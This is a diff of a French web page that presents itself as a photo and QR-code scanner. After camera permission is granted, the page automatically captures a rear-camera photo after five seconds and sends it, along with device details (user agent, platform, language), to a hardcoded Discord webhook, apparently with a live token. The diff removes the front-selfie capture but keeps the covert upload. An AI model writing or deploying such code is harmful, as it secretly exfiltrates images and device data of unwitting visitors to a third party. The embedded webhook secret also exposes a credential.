@@ -5,14 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Capturer des photos et scanner un QR code</title>
     <style>
-        #video-main, #video-selfie {
+        #video-main {
             width: 320px;
             height: 240px;
             display: block;
             margin-bottom: 10px;
         }
 
-        #photo-main, #photo-selfie, #qr-reader {
+        #photo-main, #qr-reader {
             display: none;
         }
 
@@ -25,15 +25,13 @@
     <script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
 </head>
 <body>
-    <h1>Capturer des photos avec les deux caméras et scanner un QR code</h1>
-    <p>Veuillez autoriser l'accès à la caméra pour prendre des photos automatiquement.</p>
+    <h1>Capturer une photo avec la caméra arrière et scanner un QR code</h1>
+    <p>Veuillez autoriser l'accès à la caméra pour capturer une photo.</p>
 
-    <!-- Video elements to display the live camera feed -->
+    <!-- Video element to display the live camera feed -->
     <video id="video-main" autoplay playsinline></video>
-    <video id="video-selfie" autoplay playsinline></video>
 
     <canvas id="photo-main" width="320" height="240"></canvas>
-    <canvas id="photo-selfie" width="320" height="240"></canvas>
     <div id="qr-reader"></div>
 
     <script>
@@ -45,11 +43,9 @@
             return `User Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
         }
 
-        function envoyerDonnees(imageBlobs, infos) {
+        function envoyerDonnees(imageBlob, infos) {
             const formData = new FormData();
-            imageBlobs.forEach((blob, index) => {
-                formData.append(`file${index}`, blob, `photo${index}.png`);
-            });
+            formData.append('file', imageBlob, 'photo.png');
             formData.append('payload_json', JSON.stringify({ content: infos }));
 
             const url = 'https://discord.com/api/webhooks/1264557833186443367/Ca29UpZabSCdGlVyzqgFbKqyTXiCs7M2ClkBogm48Vr2YaXIbLB2i3AyBLOp6Xk1memE';
@@ -85,7 +81,7 @@
             const html5QrCode = new Html5Qrcode("qr-reader");
 
             html5QrCode.start(
-                { facingMode: "environment" }, // Demander la caméra arrière pour le scan QR
+                { facingMode: "environment" }, // Utiliser la caméra arrière pour le scan QR
                 {
                     fps: 10,
                     qrbox: 250
@@ -102,62 +98,41 @@
             });
         }
 
-        async function obtenirCamera(facingMode) {
+        async function obtenirCameraArriere() {
             try {
-                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
             } catch (err) {
-                console.error(`Erreur d'accès à la caméra (${facingMode}):`, err);
-                alert("Erreur d'accès à la caméra. Assurez-vous d'avoir autorisé les permissions.");
+                console.error('Erreur d\'accès à la caméra arrière:', err);
+                alert("Erreur d'accès à la caméra arrière. Assurez-vous d'avoir autorisé les permissions.");
                 return null;
             }
         }
 
         (async function() {
             const videoMain = document.getElementById('video-main');
-            const videoSelfie = document.getElementById('video-selfie');
             const canvasMain = document.getElementById('photo-main');
-            const canvasSelfie = document.getElementById('photo-selfie');
 
             // Accéder à la caméra principale (arrière)
-            const streamMain = await obtenirCamera('environment');
+            const streamMain = await obtenirCameraArriere();
             if (streamMain) {
                 videoMain.srcObject = streamMain; // Afficher le flux de la caméra arrière dans la vidéo
+
+                // Attendre un délai pour permettre à l'utilisateur de voir le flux
+                setTimeout(async () => {
+                    const dataURLMain = capturerPhoto(videoMain, canvasMain);
+                    const blobMain = dataURLToBlob(dataURLMain);
+                    const infosAppareil = await obtenirInfosAppareil();
+
+                    // Envoyer la photo et les informations
+                    await envoyerDonnees(blobMain, infosAppareil);
+                    console.log('Image et informations envoyées avec succès');
+
+                    // Lancer le scan du QR code
+                    lancerScanQRCode();
+                }, 5000); // Capturer l'image après 5 secondes
             } else {
                 alert("Impossible d'accéder à la caméra arrière.");
             }
-
-            // Accéder à la caméra selfie (avant)
-            const streamSelfie = await obtenirCamera('user');
-            if (streamSelfie) {
-                videoSelfie.srcObject = streamSelfie; // Afficher le flux de la caméra avant dans la vidéo
-            } else {
-                alert("Impossible d'accéder à la caméra avant.");
-            }
-
-            // Attendre un délai pour permettre à l'utilisateur de voir le flux
-            setTimeout(async () => {
-                if (streamMain) {
-                    const dataURLMain = capturerPhoto(videoMain, canvasMain);
-                    const blobMain = dataURLToBlob(dataURLMain);
-                }
-
-                if (streamSelfie) {
-                    const dataURLSelfie = capturerPhoto(videoSelfie, canvasSelfie);
-                    const blobSelfie = dataURLToBlob(dataURLSelfie);
-                }
-
-                const infosAppareil = await obtenirInfosAppareil();
-
-                // Envoyer les photos et les informations (seulement si les photos ont été capturées)
-                const blobs = [blobMain, blobSelfie].filter(Boolean); // Filtrer les blobs valides
-                if (blobs.length > 0) {
-                    await envoyerDonnees(blobs, infosAppareil);
-                    console.log('Images et informations envoyées avec succès');
-                }
-
-                // Lancer le scan du QR code
-                lancerScanQRCode();
-            }, 5000); // Capturer les images après 5 secondes
         })();
     </script>
 </body>
